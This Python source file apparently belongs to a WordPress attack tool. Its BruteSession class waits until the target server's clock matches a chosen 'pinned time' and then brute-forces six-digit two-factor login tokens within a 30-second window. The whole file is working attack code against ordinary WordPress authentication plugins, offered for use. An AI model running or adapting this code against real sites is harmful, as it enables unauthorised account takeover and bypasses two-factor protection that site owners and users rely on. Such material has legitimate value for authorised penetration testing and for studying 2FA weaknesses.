# -*- coding: utf-8 -*-

import requests
import time

from email.utils import parsedate
from datetime import datetime, timedelta
from progressbar import ProgressBar, Percentage, Bar, FormatLabel, Timer
from wpbiff.core.wpauthenticator import WPLogin

class BruteSession:
    def __init__(self, pinned_time, url, username, password, token, max_token, user_agent, plugin):
        # This is the pinned time where we brute force the login token
        self.pinned_time = datetime.strptime(pinned_time, '%Y-%m-%d %H:%M')
        # Stores Wordpress URL
        self.url = url
        # Stores object that does the authentication to Wordpress
        wp_factory = WPLogin(url, username, password, user_agent)
        self.wp_login = wp_factory.make(plugin)
        # Stores current value of login token
        self.token = token
        # Stores User-Agent value for the requests library
        self.user_agent = user_agent
        # Maximum value of 6 digit login token
        self.max_token = max_token
        # Progress bar
        widgets = [FormatLabel('Token: %(value)d (to %(max)d)'), Percentage(), Bar(), ' ', Timer()]
        self.pbar = ProgressBar(widgets=widgets, maxval=max_token).start()

    def get_server_time(self):
        """
        Gets remote server time using HTTP
        """
        headers = {
            'User-Agent': self.user_agent
        }
        # Sometimes HEAD requests fail so we try multiple times
        for attempt in range(10):
            try:
                r = requests.head(self.url, headers=headers)
            except requests.exceptions.ConnectionError:
                time.sleep(3)
            else:
                break
        if r.status_code == 200:
            t = parsedate(r.headers['Date'])
            return datetime.fromtimestamp(time.mktime(t))
        else:
            raise Exception('Remote server did not respond. Is it down?')

    def brute_login(self, delay):
        """
        Launches brute-forcing attempts
        """
        brute_launch_time = datetime.now()
        for token in xrange(self.token, self.max_token + 1):
            # Save actual value of token
            self.token = token
            self.pbar.update(token)
            # Calculate how long we do the brute forcing attempts
            elapsed = datetime.now() - brute_launch_time
            # Launch HTTP requests if we are still within the ~30 second window
            if elapsed < timedelta(seconds=30) - delay:
                # Launch HTTP request with token code, return immediately if attampt is successful
                result = self.wp_login.auth(token)
                if result:
                    return result
            else:
                return False

    def run(self):
        """
        Monitors remote server for pinned time and launches brute forcing
        """
        while self.token < self.max_token:
            # Calculate difference between pinned time and server time
            delta_time = abs(self.get_server_time() - self.pinned_time)
            if delta_time < timedelta(seconds=30):
                # Server time has been modified, launching attack
                result = self.brute_login(delta_time)
                # Save result and break from loop if token is found
                if result:
                    self.pbar.finish()
                    return result
            else:
                # If server time has not turned back, sleep for a while and try again
                time.sleep(1)
